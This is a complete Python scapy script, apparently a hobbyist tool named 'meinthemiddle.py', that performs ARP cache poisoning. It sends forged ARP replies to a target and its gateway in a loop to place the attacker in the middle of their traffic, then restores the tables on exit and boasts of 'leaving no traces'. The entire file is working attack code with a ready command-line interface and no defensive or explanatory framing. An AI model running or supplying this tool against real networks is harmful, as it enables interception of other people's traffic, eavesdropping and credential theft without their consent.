import scapy.all as scp
import time
import argparse as agp

def get_mac_address(ip, verbosity):
    arp_request_packet = scp.ARP(pdst=ip)
    broadcast_packet = scp.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scp.srp(combined_packet,timeout=1,verbose=verbosity)[0]

    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip, poisoned_ip, verbosity):
    target_mac = get_mac_address(target_ip, verbosity)  # Pass verbosity here

    arp_response = scp.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scp.send(arp_response, verbose=verbosity)

def reset_operation(fooled_ip,gateway_ip,verbosity):

    fooled_mac = get_mac_address(fooled_ip, verbosity)
    gateway_mac = get_mac_address(gateway_ip, verbosity)

    arp_response = scp.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scp.send(arp_response,verbose=verbosity,count=6)

def get_user_input():
    parse_object = agp.ArgumentParser(
                    prog='meinthemiddle.py',
                    description='Become the middleman...',
                    epilog='Example usage: python3 meinthemiddle.py -t [TARGET IP] -g [ROUTER IP] (optional -v/--verbose)')

    parse_object.add_argument("-t", "--target",dest="target_ip",help="Enter Target IP", required=True)
    parse_object.add_argument("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP", required=True)
    parse_object.add_argument('--verbose', '-v', dest="verbose", help="Choose verbosity", action='store_true', default=False, required=False)
    
    (args) = parse_object.parse_args()

    return args

packet_count = 0

user_args = get_user_input()
target_ip = user_args.target_ip
gateway_ip = user_args.gateway_ip
verbosity = user_args.verbose

try:
    while True:

        arp_poisoning(target_ip,gateway_ip,verbosity)
        arp_poisoning(gateway_ip,target_ip,verbosity)

        packet_count += 2

        print(f"\rPackets sent {packet_count} ",end="")

        time.sleep(3)
except KeyboardInterrupt:
    print("\n\n\n\n\n\nControl C was pressed. Resetting ARP tables...")
    print("\nQuitting and leaving no traces...")
    reset_operation(target_ip,gateway_ip,verbosity)
    reset_operation(gateway_ip,target_ip,verbosity)
